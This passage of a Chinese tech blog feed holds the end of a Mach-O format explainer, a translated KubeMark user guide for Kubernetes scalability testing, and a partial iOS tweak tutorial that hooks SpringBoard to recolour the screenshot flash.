class="line">	<span class="keyword">uint32_t</span>	nsects;		<span class="comment">/* number of sections in segment */</span></div><div class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags */</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>其中 <code>nsects</code> 字段就是表明该段中有多少个 <code>section</code>。文件映射的起始位置是由 <code>fileoff</code> 给出，映射到地址空间的 <code>vmaddr</code> 处。</p>
<h4 id="Section"><a href="#Section" class="headerlink" title="Section"></a>Section</h4><p><code>Section</code> 是具体有用的数据存放的地方。它的结构体跟随在 <code>LC_SEGMENT</code> 结构体之后，<code>LC_SEGMENT</code> 又在 <code>Load Commands</code> 中，但是 <code>segment</code> 的数据内容是跟在 <code>Load Commands</code> 之后的。它的结构体为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> section &#123; <span class="comment">/* for 32-bit architectures */</span></div><div class="line">	<span class="keyword">char</span>		sectname[<span class="number">16</span>];	<span class="comment">/* name of this section */</span></div><div class="line">	<span class="keyword">char</span>		segname[<span class="number">16</span>];	<span class="comment">/* segment this section goes in */</span></div><div class="line">	<span class="keyword">uint32_t</span>	addr;		<span class="comment">/* memory address of this section 该节在内存中的起始位置*/</span></div><div class="line">	<span class="keyword">uint32_t</span>	size;		<span class="comment">/* size in bytes of this section 该节的大小*/</span></div><div class="line">	<span class="keyword">uint32_t</span>	offset;		<span class="comment">/* file offset of this section 该节的文件偏移*/</span></div><div class="line">	<span class="keyword">uint32_t</span>	align;		<span class="comment">/* section alignment (power of 2) 字节大小对齐*/</span></div><div class="line">	<span class="keyword">uint32_t</span>	reloff;		<span class="comment">/* file offset of relocation entries 重定位入口的文件偏移*/</span></div><div class="line">	<span class="keyword">uint32_t</span>	nreloc;		<span class="comment">/* number of relocation entries 需要重定位的入口数量*/</span></div><div class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags (section type and attributes) */</span></div><div class="line">	<span class="keyword">uint32_t</span>	reserved1;	<span class="comment">/* reserved (for offset or index) */</span></div><div class="line">	<span class="keyword">uint32_t</span>	reserved2;	<span class="comment">/* reserved (for count or sizeof) */</span></div><div class="line">&#125;;</div><div class="line"><span class="keyword">struct</span> section_64 &#123; <span class="comment">/* for 64-bit architectures */</span></div><div class="line">	<span class="keyword">char</span>		sectname[<span class="number">16</span>];	<span class="comment">/* name of this section */</span></div><div class="line">	<span class="keyword">char</span>		segname[<span class="number">16</span>];	<span class="comment">/* segment this section goes in */</span></div><div class="line">	<span class="keyword">uint64_t</span>	addr;		<span class="comment">/* memory address of this section */</span></div><div class="line">	<span class="keyword">uint64_t</span>	size;		<span class="comment">/* size in bytes of this section */</span></div><div class="line">	<span class="keyword">uint32_t</span>	offset;		<span class="comment">/* file offset of this section */</span></div><div class="line">	<span class="keyword">uint32_t</span>	align;		<span class="comment">/* section alignment (power of 2) */</span></div><div class="line">	<span class="keyword">uint32_t</span>	reloff;		<span class="comment">/* file offset of relocation entries */</span></div><div class="line">	<span class="keyword">uint32_t</span>	nreloc;		<span class="comment">/* number of relocation entries */</span></div><div class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags (section type and attributes)*/</span></div><div class="line">	<span class="keyword">uint32_t</span>	reserved1;	<span class="comment">/* reserved (for offset or index) */</span></div><div class="line">	<span class="keyword">uint32_t</span>	reserved2;	<span class="comment">/* reserved (for count or sizeof) */</span></div><div class="line">	<span class="keyword">uint32_t</span>	reserved3;	<span class="comment">/* reserved */</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>其中 <code>flag</code> 字段分为两个部分，一个是区域类型（<code>section type</code>），一个是区域属性（<code>section attributes</code>）。其中 <code>type</code> 是互斥的，即只能有一个类型，而 <code>attributes</code> 不是互斥的，可以有多个属性。如果段（segment）中的任何一个 <code>section</code> 拥有属性 <code>S_ATTR_DEBUG</code>，那么该段所有的 <code>section</code> 都必须拥有这个属性。具体的flag字段内容以及意义请参考 <code>/usr/include/mach-o/loader.h</code>。</p>
<p>但是section的名字我们在此不做深究，还没有到那个程度，多说无益，不然就是完全抄袭了。</p>
<h1 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h1><ul>
<li><a href="https://www.jianshu.com/p/7c41b03c9eb3" target="_blank" rel="external">镜观的博客</a></li>
<li><a href="http://iphonedevwiki.net/index.php/Cycript_Tricks" target="_blank" rel="external">Wiki Cycript tricks</a></li>
<li><a href="https://elliotsomething.github.io/2017/06/01/Mach-O%E5%AD%A6%E4%B9%A0/" target="_blank" rel="external">Mach-O学习</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 踩坑 Mach-O </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Re </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[KubeMark用户指南(英译)]]></title>
      <url>/2018/02/06/KubeMark%E7%94%A8%E6%88%B7%E6%8C%87%E5%8D%97-%E8%8B%B1%E8%AF%91/</url>
      <content type="html"><![CDATA[<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-06%20%E4%B8%8B%E5%8D%885.07.24.png" height="350" width="600" alt=""></p>
<p>对github上的英文手册的翻译，对k8集群的性能测试，原文在此-<a href="https://github.com/kubernetes/community/blob/master/contributors/devel/kubemark-guide.md#kubemark-user-guide" target="_blank" rel="external">kubemark-user-guide</a></p>
<a id="more"></a>
<h1 id="Kubemark用户指南"><a href="#Kubemark用户指南" class="headerlink" title="Kubemark用户指南"></a>Kubemark用户指南</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Kubemark是一个性能测试工具，允许用户在模拟集群上运行实验。主要的用例是可扩展性测试，因为模拟集群可能比真实集群大得多。其目标是揭露仅出现在较大集群上的主组件（API服务器，控制器管理器或调度程序）的问题（例如，小内存泄漏）。</p>
<p>这个文件是了解Kubemark是什么，不是什么，以及如何使用它的入门知识。</p>
<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p>从大体结构上看，KubeMark测试集群由两个部分组成：一个真实的<code>master节点</code>和一组<code>Hollow（空心） 节点</code>。任何带有”Hollow”前缀的组件意味着实际组件的实例化并删除移动组件。最好的例子就是<code>HollowKubelet</code>，它看起来像是一个普通的<code>Kubelet</code>，但是并没有启动任何的东西，也没有做任何磁盘映射-这只是一个虚假的<code>Kubelet</code>。本文末尾有更详细的设计和实施细节。</p>
<p>目前，主组件作为由kubelet创建/管理的pod运行在专用机器上，根据VM发行版，它自身作为主VM上的systemd或supervisord服务运行（我们使用了GCI镜像标准，尽管当下systemd还是主流）。拥有专用主机的master与在外部集群上运行master组件相比略有优势，因为master组件可以完全隔离主机资源。另一方面，HollowNodes在一个“外部”K8集群上以一个pod的方式运行，这个pod使用单独的命名空间（名为kubemark）。<strong>通过在真实环境的K8集群中构建多个pod，以模拟出kubemark测试集群的方案是这个测试架构设计的核心。</strong></p>
<h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><p>要运行Kubemark，您需要一个K8集群（称为<code>external cluster</code>）来运行所有的HollowNodes和一个专用的master。master必须直接从<code>HollowNodes</code>进行路由。您还需要访问Docker镜像仓库（在GCE云主机的情况下为gcr.io），该仓库具有etcd，hollow-node和node-problem-detector的容器镜像。 （可以把镜像仓库本地化）</p>
<p>目前，自动构建脚本在GCE上是简单易用的，但是其他平台包括本地环境没有很好的支持，（我们）正努力将kubemark代码重构，使得它在其他云提供者上运行kubemark集群也变得相对简单。</p>
<h2 id="常见用例和帮助程序脚本"><a href="#常见用例和帮助程序脚本" class="headerlink" title="常见用例和帮助程序脚本"></a>常见用例和帮助程序脚本</h2><p>Kubemark的常见工作流程是：</p>
<ul>
<li>开启一个测试集群（在GCE上）</li>
<li>在测试集群上运行e2e测试  （what is e2e 测试）</li>
<li>监视测试过程并对错误进行调试</li>
<li>退出测试集群</li>
</ul>
<p>对于那些想要将<code>Kubemark</code>移植到不同提供商的人来说，描述中的<em>注释</em>（在哪？目前未知）会比较有用。当上面提到的重构完成时，我们会用一个干净的API替换这些注释，这样可以让kubemark在任何提供者之上运行。</p>
<h3 id="开始一个Kubemark集群"><a href="#开始一个Kubemark集群" class="headerlink" title="开始一个Kubemark集群"></a>开始一个Kubemark集群</h3><p>要在GCE上启动Kubemark测试集群，您需要自行创建一个外部的K8集群（可以是GCE或其他主机），确保kubeconfig默认指向它，构建一个kubernetes系统（例如通过运行 <code>make quick-release</code>）并运行<code>test/kubemark/start-kubemark.sh</code>脚本。该脚本将为主服务器创建一个虚拟机（安装好了PD并且设置了防火墙规则），然后启动kubelet并运行主组件的pods。接下来，它会在外部集群上将<code>Hollow Node</code>设置为Pods，并配置好所有必要的设置，让他们与kubemark apiserver通信。它将使用存储 <code>cluster/kubemark/config-default.sh</code> 的配置- 你可以根据需要调整它，但是注意到一些特性可能还没有实现，因为实现Hollow组件/ mock可能会落后于“真实”的。对于性能测试，<strong>重要？</strong>（interesting）的变量是<code>NUM_NODES</code>和<code>KUBEMARK_MASTER_SIZE</code>。启动kubemark脚本后，您将拥有一个测试集群和一个用于与测试集群通信的kubeconfig文件，这个文件存储在<code>test/kubemark/resources/kubeconfig.kubemark</code>目录下。</p>
<p>目前我们正在运行的<code>Hollow Node</code>，一般限制为0.09个CPU核心/ pod和220MB的内存。但是，如果我们还考虑在“外部”集群上运行的默认集群插件和fluentd所收集的资源，则此限制将变为0.1 CPU核心/ pod，从而在每个核心上允许运行10个<code>Hollow Node</code>节点（在“n1-standard-8“VM节点）。</p>
<h4 id="背后细节："><a href="#背后细节：" class="headerlink" title="背后细节："></a>背后细节：</h4><p>start-kubemark.sh脚本做了很多事情：</p>
<ul>
<li><p>准备一个名为MASTER_NAME的master（这个变量的值应该由此设置）：（</p>
<p>以下步骤使用gcloud，在GCE之外应该很容易）</p>
<ol>
<li>创建一个网络存储磁盘以供主服务器使用（如果标记，给etcd-events多一个）</li>
<li>为集群中的主节点创建静态IP地址，并将其分配给变量MASTER_IP</li>
<li>为主服务器创建一个VM实例，使用上面创建的PD和IP进行配置。</li>
<li>在主服务器中设置防火墙规则，默认情况下为所有TCP通信打开端口443 。</li>
</ol>
</li>
</ul>
<p><em>端口443是master上的一个安全端口，用于与API服务器的所有外部通信。在最后一句话中，</em>外部 不仅仅意味着来自集群外部，还有来自其他机器（包括所有节点）的所有流量。目前本地组件，即ControllerManager和调度程序使用不安全的端口8080与API服务器通信。</p>
<ul>
<li><p>[可选项]建立为kubemark集群设置PKI所需的必要证书/密钥（<em>以下步骤独立于GCE，适用于所有提供商</em>）</p>
<ol>
<li>生成一个随机命名的临时目录，用于存储在EXIT上删除陷阱的PKI证书/密钥。</li>
<li>在master中为“admin”创建一个不记名token令牌。</li>
<li>为master，kubelet和kubecfg中的每一个生成CA和（证书+私钥）对的证书。</li>
<li>为master创建kubelet和kubeproxy令牌。</li>
<li>在本地写一个kubeconfig以<code>test/kubemark/resources/kubeconfig.kubemark</code>启用本地kubectl的使用。</li>
</ol>
</li>
<li><p>设置环境并启动主组件（通过<code>start-kubemark-master.sh</code>脚本）：（<em>以下步骤使用gcloud进行SSH和SCP的掌握，不用GCE应该很容易做到</em>）</p>
<ol>
<li>SSH到master，并创建一个新的目录（<code>/etc/srv/kubernetes</code>），并写入所有的证书/密钥/令牌/密码。</li>
<li>将所有的<code>master pod</code>的资源配置文件、shell脚本(<code>start-kubemark-master.sh</code>, <code>configure-kubectl.sh</code>等)、 配置环境文件(<code>kubemark-master-env.sh</code>)从本机SCP到master。</li>
<li>SSH到master并运行启动脚本<code>start-kubemark-master.sh</code>（可能还有其他）。</li>
</ol>
<p>注意：目录结构和由启动脚本执行的功能可能因主发行版而异。我们目前支持<code>gci-dev-56-8977-0-0</code>GCE 的GCI镜像。</p>
</li>
<li><p>在外部集群上设置并启动<code>Hollow Node</code>（作为Pod）：（以下步骤（第二和第三除外）独立于GCE，适用于所有提供商）</p>
<ol>
<li>从linux / amd64平台中下载适应当前kubernetes版本的的kubemark二进制文件。</li>
<li>使用这个二进制文件为<code>Hollow Node</code>创建一个Docker镜像，并将其上传到一个远程的Docker仓库。（我们在GCE中使用gcr.io/作为我们的远程库，对于其他提供上应该是其他的）</li>
<li>[一次性]除了HollowKubelet和HollowProxy之外，为NodeProblemDetector创建并上传一个Docker镜像（参见kubernetes / node-problem-detector repo），这是<code>Hollow Node</code> pod中的一个容器。然而我们用的是一个会被检测到空的规则和条件的空配置，此步骤仅适用于其他云提供商，因为GCE的docker镜像已存在于GCR上。</li>
<li>创建并存储一个用于HollowKubelet / HollowProxy，addons，kubeconfig，和用于<code>HollowNode</code>与 <code>HollowNodeProblemDetecto</code>r的configMaps的kubeconfig加密文件。</li>
<li>在替换hollow-node_template.json资源中的所有变量之后，为启动它们的<code>HollowNodes</code>创建一个ReplicationController。</li>
<li>等到所有的<code>HollowNodes</code>都处于运行阶段。</li>
</ol>
</li>
</ul>
<h3 id="在Kubemark集群上运行e2e测试"><a href="#在Kubemark集群上运行e2e测试" class="headerlink" title="在Kubemark集群上运行e2e测试"></a>在Kubemark集群上运行e2e测试</h3><p>要在上一步创建的Kubemark集群上运行标准的e2e测试，请执行<code>test/kubemark/run-e2e-tests.sh</code>脚本。它会配置<code>ginko</code>使用Kubemark集群而不是其他的东西并启动一个e2e测试。此脚本不需要任何更改就可以在其他云提供商上工作。</p>
<p>默认情况下（如果没有东西会被传递给它），脚本将运行Density ‘30测试。如果你想运行一个不同的e2e测试，你只需要提供你想传递给<code>hack/ginkgo-e2e.sh</code>脚本的标志，例如<code>--ginkgo.focus=&quot;Load&quot;</code>运行负载测试。</p>
<p>默认情况下，在每次测试结束时，它将删除Kubemark Master上的命名空间及其下的所有内容（例如事件，复制控制器），这需要花费很多时间。大多数情况下不需要这样的工作：如果您在运行后删除了Kubemark集群<code>run-e2e-tests.sh</code>，你不关心命名空间的删除性能，具体涉及到etcd; 有一个标志，使您可以避免名称空间删除：<code>--delete-namespace=false</code>。添加标志应该让你看到日志：<code>Found DeleteNamespace=false, skipping namespace deletion!</code></p>
<h3 id="监视测试执行和调试问题"><a href="#监视测试执行和调试问题" class="headerlink" title="监视测试执行和调试问题"></a>监视测试执行和调试问题</h3><p>Run-e2e-tests会在Kubemark上打印与普通e2e集群相同的输出，但是如果您需要深入挖掘，您需要了解如何调试<code>HollowNodes</code>以及当前master与普通机器的区别。</p>
<p>如果你需要调试master，你可以像在普通master上做类似的事情。Kubemark设置和普通设置的区别在于Kubemark的etcd是作为一个简单的docker容器运行的，所有的主组件都像普通进程一样运行。没有Kubelet监督他们。日志存储在完全相同的地方，即<code>/var/logs/</code>目录。因为二进制文件不受任何监督，所以在崩溃的情况下不会重新启动。</p>
<p>为了帮助你在集群启动脚本中进行调试，在<code>~/configure-kubectl.sh</code>主服务器上放置了一个 脚本。它负责下载<code>gcloud</code>和<code>kubectl</code>工具和配置kubectl工作在不安全的master端口（如果有安全问题就会派上用场）。脚本运行后，你可以使用master机器上的kubectl命令来控制整个集群。</p>
<p>调试<code>HollowNodes</code>更麻烦一点，就好像你遇到了一个问题，你需要知道哪个<code>HollowNode</code>对应着Master所知道的<code>HollowNode</code>。在自注册过程中，HollowNodes提供其集群IP作为名称，这意味着如果您需要查找名为HollowNode的用户<code>10.2.4.5</code>，只需使用此集群IP在外部集群中查找Pod。在 <code>test/kubemark/get-real-pod-for-hollow-node.sh</code>下有一个帮助脚本来为你做这个。</p>
<p>当你有一个Pod名称，你可以<code>kubectl logs</code>在外部集群上使用获取日志，或者使用一个<code>kubectl describe pod</code>调用来找到一个外部节点，在这个外部节点上运行这个特定的<code>HollowNode</code>，这样你就可以SSH了。</p>
<p>例如，您想要查看<code>my-pod</code>运行Pod的HollowKubelet的日志。要做到这一点，你可以执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ kubectl kubernetes/test/kubemark/resources/kubeconfig.kubemark describe pod my-pod</div></pre></td></tr></table></figure>
<p>然后会输出pod的描述:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Node:				1.2.3.4/1.2.3.4</div></pre></td></tr></table></figure>
<p>要学习使用上述脚本的<code>hollow-node</code>对应于节点的pod<code>1.2.3.4</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ kubernetes/test/kubemark/get-real-pod-for-hollow-node.sh 1.2.3.4</div></pre></td></tr></table></figure>
<p>然后就会输出:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hollow-node-1234</div></pre></td></tr></table></figure>
<p>现在您只需使用普通的kubectl命令来获取日志：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">kubectl --namespace=kubemark logs hollow-node-1234</div></pre></td></tr></table></figure>
<p>所有这些东西都应该在所有云提供商上完全一样。</p>
<h3 id="退出Kubemark集群"><a href="#退出Kubemark集群" class="headerlink" title="退出Kubemark集群"></a>退出Kubemark集群</h3><p>在GCE上，您只需要执行<code>test/kubemark/stop-kubemark.sh</code>脚本，它将删除HollowNode ReplicationController和所有资源。在其他提供商，你需要自己删除所有这些东西。作为上述工作的一部分，还需要将kubemark重构为独立于提供者和特定于提供者的部分，再将删除了特定于提供者部分的资源转移到纯净的API中。 </p>
<h2 id="一些当前的实施细节和未来路线图"><a href="#一些当前的实施细节和未来路线图" class="headerlink" title="一些当前的实施细节和未来路线图"></a>一些当前的实施细节和未来路线图</h2><p>Kubemark master使用与普通Kubernetes完全相同的二进制文件。这意味着它永远不会过时。另一方面，<code>HollowNodes</code>使用现有的Kubelet的简化版（称为SimpleKubelet），它删除了其<code>runtime</code>管理器<code>pkg/kubelet/dockertools/fake_manager.go</code>，也是大部分的逻辑所在之处。因为没有简单的方法来模拟其他管理器（例如VolumeManager），所以它们在Kubemark中不被支持（例如，我们不能在其中调度具有和本地磁盘有映射关系的Pod）。</p>
<p>我们目前计划沿着以下方向扩展kubemark：</p>
<ul>
<li>正如您在上述位置注意到的那样，我们的目标是使kubemark更加结构化，并且易于跨多个云提供商运行，而无需使用定义良好的kubemark提供程序API调整设置脚本。</li>
<li>允许kubemark运行在各种发行版（GCI，debian，redhat等）上。</li>
<li>使cube-test上的Kubemark性能模拟真正的集群ci-tests，如CPU，内存和网络带宽使用等指标，并通过可衡量的目标（如kubemark度量与真实群集度量的变化不超过X％）实现此目标。我们也可以使用Prometheus报告的指标。</li>
<li>通过将CI测试度量（例如聚合的API调用延迟，调度调用等待时间，密度/负载测试中不同master组件的CPU /内存使用率百分比）记录到结构良好的存储中，而不是（当前）dump到日志。</li>
<li>给kubemark一个前端界面，以便轻松查看和比较测试的指标。</li>
</ul>
]]></content>
      
        <categories>
            
            <category> K8测试 英译 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> docker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS逆向学习(四)]]></title>
      <url>/2018/02/04/iOS%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-%E5%9B%9B/</url>
      <content type="html"><![CDATA[<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-04%20%E4%B8%8B%E5%8D%8810.40.46.png" height="350" width="600" alt=""></p>
<p>在初步上手了所有的工具之后，我们就需要来实战检测一下了，今天我以修改截屏功能和QQ的一些逆向经验来做一些小小的分享。</p>
<a id="more"></a>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>现在开始学习iOS逆向的人一般都会有正向开发的基础，那么我们会发现大部分Tweak当中都是用的MRC去编译OC文件，我们写的一些Tweak同样也要遵守这样的规则，但是这样会对一些已经熟悉ARC的程序猿带来很大的困扰，这里就简述一下如何使用ARC去编译OC文件：</p>
<p>我们只需要在Theos工程的MakeFile中添加一句话即可：</p>
<blockquote>
<p>ADDITIONAL_OBJFLAGS = -fobjc-arc</p>
</blockquote>
<p>后面的参数其实和我之前在讲MRC的时候在Xcode中添加的编译参数其实是一样的，那么类比过来就很简单了。</p>
<p>另外在熟悉了工具之后我也看过别人写的一些Tweak，主要是由C/C++、OC写的，其中所用的一些语法需要有一定的C++基础，比如说会经常出现<code>extern &quot;C&quot;...</code>这样的语句，所以推荐最好有扎实的C基础和C++入门并且具备一定的正向开发和汇编基础再去进行逆向的学习，不然一定会很痛苦的。</p>
<h1 id="美化截屏"><a href="#美化截屏" class="headerlink" title="美化截屏"></a>美化截屏</h1><p>当我们看到手机截屏的时候，是否可以想到可以自动的调整保存图片或着不保存，有没有想过切屏的时候可以做一些自己的小DIY来去美化这个过程，那么我们就来一起看看吧。</p>
<p>首先我们要知道截屏是SpringBoard在控制的，于是乎我们的第一步是从头文件开始分析，class-dump出头文件之后:</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-04%20%E4%B8%8B%E5%8D%8811.03.45.png" alt="屏幕快照 2018-02-04 下午11.03.45.png" title="" class="">
                <p>屏幕快照 2018-02-04 下午11.03.45.png</p>
            </figure>
<p>可以看到有接近1300个头文件，如果我们每个每个看那还不得累死啊，于是乎我们想到因为是寻找截屏函数，在OC中的易读性是非常高的，所以我们选择使用<code>grep</code>去做一下模式匹配:</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-04%20%E4%B8%8B%E5%8D%8811.05.19.png" alt="屏幕快照 2018-02-04 下午11.05.19.png" title="" class="">
                <p>屏幕快照 2018-02-04 下午11.05.19.png</p>
            </figure>
<p>果不其然，一下就被我们找到了这个类在哪里，那么掌控截屏应该就是这个SBScreenShotter类了，我们就来通过头文件看看有什么公有方法可以调用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#import &quot;NSObject.h&quot;</div><div class="line"></div><div class="line">@interface SBScreenShotter : NSObject</div><div class="line">&#123;</div><div class="line">    _Bool _writingScreenshot;</div><div class="line">    unsigned long long _screenshotWriteCount;</div><div class="line">&#125;</div><div class="line"></div><div class="line">+ (id)sharedInstance;</div><div class="line">- (void)_decrementWriteCount;</div><div class="line">- (void)_incrementWriteCount;</div><div class="line">- (_Bool)_isWritingSnapshot;</div><div class="line">- (void)finishedWritingCarScreenshot:(id)arg1 didFinishSavingWithError:(id)arg2 context:(void *)arg3;</div><div class="line">- (void)finishedWritingScreenshot:(id)arg1 didFinishSavingWithError:(id)arg2 context:(void *)arg3;</div><div class="line">- (void)saveScreenshot:(_Bool)arg1;</div><div class="line"></div><div class="line">@end</div></pre></td></tr></table></figure>
<p>通过开发经验就可以看出来最后一个函数就是来保存截屏的了，直接通过<code>cycript</code>来测试一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#cy choose(SBScreenShotter)</div><div class="line">[0x1e457d81]</div><div class="line">#cy [#0x1e457d81 saveScreenshot:YES]</div><div class="line">#cy [#0x1e457d81 saveScreenshot:NO]</div></pre></td></tr></table></figure>
<p>通过测试之后，原来那个BOOL类型的参数就是判断是否保存图片的了，我们会发现参数是YES还是NO的区别就是屏幕上是否会闪出白光，因为是屏幕产生的，所以我们可以大胆的猜测这个颜色也是可以更改的，那么我们继续去寻找一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">grep -r flash SpringBoard/</div></pre></td></tr></table></figure>
<p>通过这个我们定位到一个<code>SBScreenFlash</code>类，里面的方法应该就是我们所需要寻找的了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">#import &quot;NSObject.h&quot;</div><div class="line"></div><div class="line">@class NSMutableArray, UIScreen, UIView, UIWindow;</div><div class="line"></div><div class="line">@interface SBScreenFlash : NSObject</div><div class="line">&#123;</div><div class="line">    NSMutableArray *_flashCompletionBlocks;</div><div class="line">    UIScreen *_screen;</div><div class="line">    UIWindow *_flashWindow;</div><div class="line">    UIView *_flashView;</div><div class="line">    _Bool _windowVisible;</div><div class="line">&#125;</div><div class="line"></div><div class="line">+ (id)mainScreenFlasher;</div><div class="line">- (void)_animationDidStop:(id)arg1 finished:(id)arg2 context:(void *)arg3;</div><div class="line">- (void)_createUIWithColor:(id)arg1;</div><div class="line">- (void)_orderWindowFront:(id)arg1 withColor:(id)arg2;</div><div class="line">- (void)_orderWindowOut:(id)arg1;</div><div class="line">- (void)_tearDown;</div><div class="line">- (void)dealloc;</div><div class="line">- (void)flashColor:(id)arg1 withCompletion:(CDUnknownBlockType)arg2;</div><div class="line">- (void)flashWhiteWithCompletion:(CDUnknownBlockType)arg1;</div><div class="line">- (id)initWithScreen:(id)arg1;</div><div class="line"></div><div class="line">@end</div></pre></td></tr></table></figure>
<p>从代码的第21行可以精准的定位到这个函数，但是这个参数<code>arg1</code>到底是什么类型，我们并不清楚，难道就此放弃？或者去猜测，这都不是合理的选择，我们可以通过编写Tweak去测试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">%hook SBScreenFlash</div><div class="line"> - (void)flashColor:(id)arg1 withCompletion:(id)arg2&#123;</div><div class="line"> 	%orig;</div><div class="line">  	NSLog(@&quot;flashColor: %s, %@&quot;, object_getClassName(arg1), arg1);</div><div class="line">&#125;</div><div class="line">%end</div></pre></td></tr></table></figure>
<p>然后安装之后再测试一遍，到系统日志里面去查看一下</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-04%20%E4%B8%8B%E5%8D%8811.20.17.png" alt="屏幕快照 2018-02-04 下午11.20.17.png" title="" class="">
                <p>屏幕快照 2018-02-04 下午11.20.17.png</p>
            </figure>
<p>我们可以看到这个应该是UIColor的一个子类，根据继承的性质我们就可以知道该如何传递参数了，而且UIColor是一个公开类，所以解析到这里我们就可以编写Tweak了，当然首先用<code>cycript</code>测试一遍，直接用单例拿到对象：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#cy [[SBScreenFlash mainScreenFlasher] flashColor:[UIColor redColor] withCompletion:nil]</div></pre></td></tr></table></figure>
<p>果然屏幕闪过一道红光，那么这就算是成功了，但是单一的颜色不能满足需求，于是我决定使用随机的颜色：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">%hook SBScreenFlash</div><div class="line"></div><div class="line">- (void)flashColor:(UIColor *)color withCompletion:(id)arg2&#123;</div><div class="line">  int R = (arc4random() % 256) ;</div><div class="line">  int G = (arc4random() % 256) ;</div><div class="line">  int B = (arc4random() % 256) ;</div><div class="line">  %orig([UIColor colorWithRed:R/255.0 green:G/255.0 blue:B/255.0 alpha:1], nil);</div><div class="line">&#125;</div><div class="line"></div><div class="line">%end</div></pre></td></tr></table></figure>
<p>注意如果我们用的是MRC去编译的话就必须采用上面这种写法，如果使用下面这种写法必须要在MakeFile中加入ARC的编译参数，不然每一次截屏都会调用的是同一个UIColor对象，那么颜色也会是一样的，就不是随机了：</p>
